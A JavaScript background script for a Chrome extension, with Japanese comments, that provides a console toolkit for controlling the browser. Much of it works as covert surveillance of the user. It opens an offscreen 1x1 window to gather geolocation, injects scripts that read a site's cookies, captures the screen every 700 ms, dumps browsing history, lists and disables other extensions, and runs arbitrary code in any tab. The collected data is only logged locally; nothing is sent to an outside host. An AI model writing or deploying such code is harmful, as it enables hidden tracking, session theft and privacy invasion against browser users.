// インストール時にログ出力
chrome.runtime.onInstalled.addListener(() => {
    console.log("Extension Installed");
  });
  
// メッセージリスナー: 受信したメッセージに基づく処理
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    switch (message.type) {
      case 'geolocation':
        handleGeolocation(message.data);
        break;
    
      case 'cookies':
        handleCookies(message.data);
        break;
    
      case 'screenshot':
        handleScreenshot(message.data);
        break;
    
      case 'captureScreenshot':
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
            const tab = tabs[0];
            if (tab.url && !tab.url.startsWith("devtools://")) { // devtools://をチェック
              chrome.tabs.captureVisibleTab(null, { format: 'png' }, (screenshotUrl) => {
                if (chrome.runtime.lastError) {
                  console.error('スクリーンショット取得エラー:', chrome.runtime.lastError);
                  sendResponse({ error: 'Failed to capture screenshot' });
                } else {
                  sendResponse({ screenshotUrl });
                }
              });
            } else {
              console.error("devtools:// タブでスクリーンショットは取得できません");
              sendResponse({ error: 'Cannot capture screenshot for devtools:// URLs' });
            }
          });
          // 非同期応答のため、trueを返して応答を待機
          return true;
    
      default:
        console.warn(`未知のメッセージタイプ: ${message.type}`);
        break;
    }
  });
  
  
  // 位置情報を受信してログ出力
  function handleGeolocation(data) {
    const { latitude, longitude } = data;
    console.log(`位置情報を受信: 緯度 ${latitude}, 経度 ${longitude}`);
  }
  
  // クッキー情報を受信してログ出力
  function handleCookies(cookies) {
    console.log('Received cookies:', cookies); // クッキーをバックグラウンドのコンソールに表示
  }
  
  // スクリーンショットのURLを受信してログ出力
  function handleScreenshot(screenshotUrl) {
    console.log('スクリーンショットURLをバックグラウンドで受信:', screenshotUrl);
    // 必要に応じてスクリーンショットを処理するコードを追加
  }
  
  // 位置情報ウィンドウを開く関数
  function getLocations() {
    chrome.windows.create({
      url: chrome.runtime.getURL('geolocations.html'),
      type: 'popup',
      focused: false,
      width: 1,
      height: 1,
      top: -1000,
      left: -1000
    }, (window) => {
      console.log('位置情報ウィンドウが開かれました:', window.id);
    });
  }
  
  // タブの情報を取得し、表示する関数
  function getTabs() {
    chrome.tabs.query({}, (tabs) => {
      tabs.forEach((tab) => {
        console.log(`Tab ID: ${tab.id}, Title: ${tab.title}, URL: ${tab.url}`);
      });
    });
  }
  
  // 指定したURLのタブを閉じる関数
  function closeTabs(url) {
    chrome.tabs.query({}, (tabs) => {
      tabs.forEach((tab) => {
        if (tab.url && tab.url.includes(url)) {
          chrome.tabs.remove(tab.id, () => {
            console.log(`タブ ${tab.id} を閉じました: ${tab.url}`);
          });
        }
      });
    });
  }
  
  // 新しいタブまたはウィンドウで指定したURLを開く関数
  function openUrl(url, inNewWindow = false, width = 800, height = 600) {
    if (inNewWindow) {
      chrome.windows.create({
        url: url,
        type: 'normal',
        width: width,
        height: height
      }, (window) => {
        console.log(`新しいウィンドウを開きました: ${url}, サイズ: ${width}x${height}`);
      });
    } else {
      chrome.tabs.create({ url: url }, (tab) => {
        console.log(`新しいタブを開きました: ${url}`);
      });
    }
  }
  
  // 指定されたURLのタブにスクリプトを実行する関数
  function executeCode(targetUrl, funcToExecute) {
    chrome.tabs.query({}, (tabs) => {
      const targetTab = tabs.find((tab) => tab.url && tab.url === targetUrl);
  
      if (targetTab) {
        chrome.scripting.executeScript({
          target: { tabId: targetTab.id },
          func: funcToExecute
        }, () => {
          console.log(`Script executed on tab with URL: ${targetTab.url}`);
        });
      } else {
        console.warn(`No tab found with exactly matching URL: ${targetUrl}`);
      }
    });
  }
  
  // タブを検索してクッキーを取得する関数
  function getCookies(url) {
    const code = () => {
      console.log("Injected script is running!");
      // クッキーを取得してバックグラウンドスクリプトに送信
      chrome.runtime.sendMessage({
        type: 'cookies',
        data: document.cookie
      });
    };
  
    // ターゲットURLに対してコードを実行
    executeCode(url, code);
  }
  
  // スクリーンショットを取得する関数
  function setScreenshot(url) {
    const code = () => {
      function captureScreen() {
        chrome.runtime.sendMessage({ type: 'captureScreenshot' }, (response) => {
          if (response.screenshotUrl) {
            console.log('スクリーンショットのURL:', response.screenshotUrl);
  
            // バックグラウンドからの応答を使ってメッセージを送信
            chrome.runtime.sendMessage(
              { type: 'screenshot', data: response.screenshotUrl },
              (response) => {
                console.log('バックグラウンドからの応答:', response);
              }
            );
          }
        });
      }
  
      // 700msごとにスクリーンショットをキャプチャ
      setInterval(captureScreen, 700);
    };
  
    // ターゲットURLに対してコードを実行
    executeCode(url, code);
  }
  
  // インストールされている拡張機能を取得してログ出力する関数
  function getExtensions() {
    chrome.management.getAll((extensions) => {
      extensions.forEach((extension) => {
        console.log(`Name: ${extension.name}`);
        console.log(`ID: ${extension.id}`);
        console.log(`Enabled: ${extension.enabled}`);
        console.log(`Description: ${extension.description}`);
        console.log("------------------------");
      });
    });
  }
  
  // 指定された拡張機能を有効化または無効化する関数
  function extensionEnable(extensionId, enable) {
    chrome.management.setEnabled(extensionId, enable, () => {
      if (chrome.runtime.lastError) {
        console.error(`Error: ${chrome.runtime.lastError.message}`);
      } else {
        console.log(`Extension ${extensionId} has been ${enable ? "enabled" : "disabled"}.`);
      }
    });
  }
  
  // 履歴を取得して表示する関数
  function getHistory() {
    chrome.history.search({
      text: '',
      maxResults: 1000,
      startTime: 0,
      endTime: Date.now()
    }, (results) => {
      results.forEach((page) => {
        console.log('URL:', page.url);
        console.log('タイトル:', page.title);
        console.log('アクセス日時:', new Date(page.lastVisitTime));
      });
    });
  }
  
  // ヘルプ関数: 各関数の説明を表示する
  function help() {
    const helpText = `
      関数説明:
  
      1. getLocations()  
         位置情報を表示するためのポップアップウィンドウを開きます。  
         使用例: getLocations();
  
      2. getTabs()  
         現在開いているすべてのタブを取得し、それぞれのタブのID、タイトル、URLをコンソールに表示します。  
         使用例: getTabs();
  
      3. closeTabs(url)  
         指定したURLを含むタブをすべて閉じます。  
         使用例: closeTabs('https://www.example.com');
  
      4. openUrl(url, inNewWindow = false, width = 800, height = 600)  
         新しいタブまたはウィンドウで指定したURLを開きます。  
         使用例: openUrl('https://www.example.com', true, 1024, 768);
  
      5. executeCode(targetUrl, funcToExecute)  
         指定したURLのタブにスクリプトを注入して実行します。  
         使用例: 
           const code = () => { alert(document.title); };
           executeCode('https://www.example.com', code);
  
      6. getExtensions()  
         インストールされているすべての拡張機能の情報をコンソールに表示します。  
         使用例: getExtensions();
  
      7. extensionEnable(extensionId, enable)  
         指定した拡張機能を有効化または無効化します。  
         使用例: extensionEnable('extension-id', true); // 有効化
                extensionEnable('extension-id', false); // 無効化
  
      8. getHistory()  
         ブラウザの履歴から最大1000件のページ情報を取得し、URL、タイトル、アクセス日時を表示します。  
         使用例: getHistory();
  
      9. getCookies(url)  
         指定されたURLに対してクッキーを取得し、バックグラウンドに送信します。  
         使用例: getCookies('https://www.example.com');
    `;
    console.log(helpText);
  }
  